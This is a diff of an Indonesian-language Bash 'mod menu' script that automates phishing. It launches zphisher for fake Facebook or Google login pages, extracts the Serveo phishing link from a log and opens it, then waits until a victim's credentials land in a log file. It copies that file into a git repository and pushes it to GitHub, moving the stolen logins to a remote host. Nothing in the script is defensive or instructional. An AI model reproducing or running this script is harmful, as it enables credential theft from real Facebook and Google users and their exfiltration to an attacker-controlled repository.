@@ -1,72 +1,70 @@
 #!/bin/bash
 
-# Warna
+# === Warna ===
 R='\033[0;31m'
 G='\033[0;32m'
 Y='\033[1;33m'
 C='\033[0;36m'
 NC='\033[0m'
 
-# Header
+# === Repo GitHub Admin ===
+GIT_DIR="$HOME/INTOOLS"  # Ganti ini
+HASIL_LOCAL="$HOME/.zphisher/sites/facebook/log.txt"
+[[ -f "$HASIL_LOCAL" ]] && rm -f "$HASIL_LOCAL"
+
+# === Header ===
 clear
-echo -e "${C}"
-echo "╔══════════════════════════════╗"
-echo "║       INTOOLS MOD MENU      ║"
-echo "╚══════════════════════════════╝"
-echo -e "${NC}"
+echo -e "${C}╔══════════════════════╗"
+echo -e "║   INTOOLS MOD MENU   ║"
+echo -e "╚══════════════════════╝${NC}"
 
-# Menu Utama
-echo -e "${Y}[1] Login Account (FB / Google)"
-echo -e "[0] Exit${NC}"
-read -p "Pilih menu: " menu
+# === Menu ===
+echo -e "${Y}[1] Login Facebook"
+echo -e "[2] Login Google"
+echo -e "[0] Keluar${NC}"
+read -p "Pilih jenis login: " pil
 
-if [[ $menu == "1" ]]; then
-    clear
-    echo -e "${Y}[1] Login Facebook"
-    echo -e "[2] Login Google${NC}"
-    read -p "Pilih jenis login: " pilihan
+case $pil in
+  1)
+    echo -e "${C}Menjalankan Facebook phishing (Serveo)...${NC}"
+    echo 1 | zphisher > /dev/null 2>&1 &
+    ;;
+  2)
+    echo -e "${C}Menjalankan Google phishing (Serveo)...${NC}"
+    echo 2 | zphisher > /dev/null 2>&1 &
+    ;;
+  0)
+    echo -e "${Y}Keluar...${NC}"; exit ;;
+  *)
+    echo -e "${R}Pilihan tidak valid${NC}"; exit ;;
+esac
 
-    if [[ $pilihan == "1" ]]; then
-        echo -e "${G}Menjalankan Zphisher - Facebook...${NC}"
-        echo 1 | zphisher &
+# === Tunggu Link Serveo ===
+echo -e "${G}Menunggu link Serveo aktif...${NC}"
+sleep 10
 
-    elif [[ $pilihan == "2" ]]; then
-        echo -e "${G}Menjalankan Zphisher - Google...${NC}"
-        echo 2 | zphisher &
-    
-    else
-        echo -e "${R}Pilihan tidak valid.${NC}"
-        exit
-    fi
+LINK=$(grep -o "https://[a-z0-9.-]*serveo.net" ~/.zphisher/server.log | head -n 1)
 
-    sleep 10
-    read -p "Kirim link ke target dan tekan Enter setelah login dilakukan..."
-
-    # Deteksi hasil
-    LOGFILE="$HOME/.zphisher/sites/facebook/log.txt"
-    [[ $pilihan == "2" ]] && LOGFILE="$HOME/.zphisher/sites/google/log.txt"
-
-    if [[ -f "$LOGFILE" ]]; then
-        echo -e "${G}Login ditemukan, menyimpan hasil...${NC}"
-        mkdir -p .data
-        cp "$LOGFILE" ".data/hasil.txt"
-
-        cd "$HOME/INTOOLS"
-        cp "$HOME/.data/hasil.txt" .
-
-        git add hasil.txt
-        git commit -m "Update hasil login"
-        git push origin main
-
-        echo -e "${C}Hasil login dikirim ke GitHub.${NC}"
-    else
-        echo -e "${R}Belum ada hasil login ditemukan.${NC}"
-    fi
-
-elif [[ $menu == "0" ]]; then
-    echo -e "${Y}Keluar...${NC}"
-    exit
-else
-    echo -e "${R}Pilihan tidak valid.${NC}"
-    exit
+if [[ -z $LINK ]]; then
+  echo -e "${R}Gagal mendapatkan link Serveo.${NC}"; exit 1
 fi
+
+# === Buka Link Otomatis ===
+echo -e "${C}Link phishing: ${Y}$LINK${NC}"
+termux-open-url "$LINK"
+echo -e "${Y}Silakan tunggu korban login...${NC}"
+
+# === Pantau File Hasil ===
+while [[ ! -s "$HASIL_LOCAL" ]]; do
+  sleep 2
+done
+
+# === Simpan & Push ke GitHub ===
+echo -e "${G}Login ditemukan, menyimpan ke GitHub...${NC}"
+cp "$HASIL_LOCAL" "$GIT_DIR/hasil.txt"
+cd "$GIT_DIR"
+git add hasil.txt
+git commit -m "Update hasil login $(date +%F_%T)"
+git push origin main
+
+echo -e "${C}Hasil login berhasil dikirim ke GitHub.${NC}"
